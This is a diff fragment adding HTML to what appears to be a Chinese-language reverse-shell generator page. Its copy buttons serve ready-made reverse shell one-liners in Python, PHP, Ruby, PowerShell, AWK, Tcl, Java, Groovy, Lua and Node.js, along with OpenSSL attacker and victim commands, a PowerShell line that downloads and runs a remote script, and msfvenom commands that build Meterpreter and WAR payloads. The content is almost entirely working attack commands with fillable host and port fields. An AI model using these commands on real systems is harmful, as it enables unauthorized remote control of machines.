+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('python002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('python002','enurl');">URL编码</button>
+                        </div>
+                      </div>    
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="python003">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span>")'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('python003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('python003','enurl');">URL编码</button>
+                        </div>
+                      </div>  
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">IP V6</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="python004">python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<span id="bash1ip" class="bash1ip" style="color:#F00;">dead:beef:2::125c</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span>");'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('python004',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('python004','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">仅windows</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="python005">C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>', <span id="bash1port" class="bash1port" style="color:#F00;">4444</span>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &#x3e; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('python005',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('python005','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- python反弹shell -->
+<!-- php反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="php001">php -r '$sock=fsockopen("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>);exec("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i &#x3c;&3 &#x3e;&3 2&#x3e;&3");'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('php001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('php001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="php002">php -r '$s=fsockopen("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>);$proc=proc_open("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i", array(0=&#x3e;$s, 1=&#x3e;$s, 2=&#x3e;$s),$pipes);'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('php002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('php002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="php002">php -r '$s=fsockopen("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>);shell_exec("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i &#x3c;&3 &#x3e;&3 2&#x3e;&3");'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('php002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('php002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="php003">php -r '$s=fsockopen("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>);`/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i &#x3c;&3 &#x3e;&3 2&#x3e;&3`;'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('php003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('php003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="php004">php -r '$s=fsockopen("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>);system("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i &#x3c;&3 &#x3e;&3 2&#x3e;&3");'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('php004',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('php004','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="php005">php -r '$s=fsockopen("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>);popen("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i &#x3c;&3 &#x3e;&3 2&#x3e;&3", "r");'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('php005',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('php005','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- ruby反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="ruby001">ruby -rsocket -e'f=TCPSocket.open("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>).to_i;exec sprintf("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i &#x3c;&%d &#x3e;&%d 2&#x3e;&%d",f,f,f)'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('ruby001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('ruby001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="ruby002">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>","<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('ruby002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('ruby002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">仅windows</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="ruby003">ruby -rsocket -e 'c=TCPSocket.new("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>","<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('ruby003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('ruby003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- openssl反弹shell -->
+                    <div class="layui-tab-item">
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">攻击者</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="openssl001">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('openssl001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('openssl001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="openssl002">openssl s_server -quiet -key key.pem -cert cert.pem -port <span id="bash1port" class="bash1port" style="color:#F00;">443</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('openssl002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('openssl002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="openssl003">ncat --ssl -vv -l -p <span id="bash1port" class="bash1port" style="color:#F00;">443</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('openssl003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('openssl003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">受害者</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="openssl004">mkfifo /tmp/s; /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>:<span id="bash1port" class="bash1port" style="color:#F00;">443</span> &#x3e; /tmp/s; rm /tmp/s</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('openssl004',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('openssl004','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- openssl反弹shell -->
+<!-- powershell反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="powershell001">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&#x3e;&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "&#x3e; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('powershell001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('powershell001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="powershell002">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>',<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&#x3e;&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&#x3e; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('powershell002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('powershell002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="powershell003">powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('powershell003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('powershell003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- powershell反弹shell -->
+<!-- AWK反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="AWK" lay-encode="true" id="AWK">awk 'BEGIN {s = "/inet/tcp/0/<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>/<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>"; while(42) { do{ printf "shell&#x3e;" |& s; s |& getline c; if(c){ while ((c |& getline) &#x3e; 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('AWK',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('AWK','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- AWK反弹shell -->
+<!-- TCLsh反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="TCLsh" lay-encode="true" id="TCLsh">echo 'set s [socket <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span>];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('TCLsh',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('TCLsh','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- TCLsh反弹shell -->
+<!-- java反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="java001" lay-encode="true" id="java001">r = Runtime.getRuntime()
+p = r.exec(["/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span>","-c","exec 5&#x3c;&#x3e;/dev/tcp/<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>/<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>;cat &#x3c;&5 | while read line; do \$line 2&#x3e;&5 &#x3e;&5; done"] as String[])
+p.waitFor()</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('java001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('java001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="java002" lay-encode="true" id="java002">String host="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>";
+int port=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&#x3e;0)so.write(pi.read());while(pe.available()&#x3e;0)so.write(pe.read());while(si.available()&#x3e;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('java002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('java002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="java003" lay-encode="true" id="java003">Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('java003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('java003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- java反弹shell -->
+<!-- war反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="war" lay-encode="true" id="war">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f war &#x3e; reverse.war
+strings reverse.war | grep jsp # in order to get the name of the file</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('war',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('war','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- war反弹shell -->
+<!-- Lua反弹shell -->
+                    <div class="layui-tab-item">
+                      <blockquote class="layui-elem-quote">Linux</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="lua" lay-encode="true" id="lua001">lua -e "require('socket');require('os');t=socket.tcp();t:connect('<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>','<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>');os.execute('/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i &#x3c;&3 &#x3e;&3 2&#x3e;&3');"</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('lua001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('lua001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">仅windows</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="lua" lay-encode="true" id="lua002">lua5.1 -e 'local host, port = "<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>", <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('lua002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('lua002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- Lua反弹shell -->
+<!-- NodeJS反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="NodeJS" lay-encode="true" id="NodeJS001">(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span>", []);
+    var client = new net.Socket();
+    client.connect(<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>, "<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('NodeJS001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('NodeJS001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="NodeJS" lay-encode="true" id="NodeJS002">require('child_process').exec('nc -e /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span>')</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('NodeJS002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('NodeJS002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="NodeJS" lay-encode="true" id="NodeJS003">-var x = global.process.mainModule.require
+-x('child_process').exec('nc <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -e /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span>')</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('NodeJS003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('NodeJS003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="NodeJS" lay-encode="true" id="NodeJS004">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('NodeJS004',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('NodeJS004','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- NodeJS反弹shell -->
+<!-- Groovy反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="Groovy" lay-encode="true" id="Groovy">String host="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>";
+int port=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&#x3e;0)so.write(pi.read());while(pe.available()&#x3e;0)so.write(pe.read());while(si.available()&#x3e;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Groovy',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Groovy','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- Groovy反弹shell -->       
+<!-- Meterpreter Shell反弹shell -->             
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter001">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f exe &#x3e; reverse.exe</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter002">msfvenom -p windows/shell_reverse_tcp LHOST=<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f exe &#x3e; reverse.exe</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter003">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f elf &#x3e;reverse.elf</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter003',null);" >复&nbsp;&nbsp;制</button>
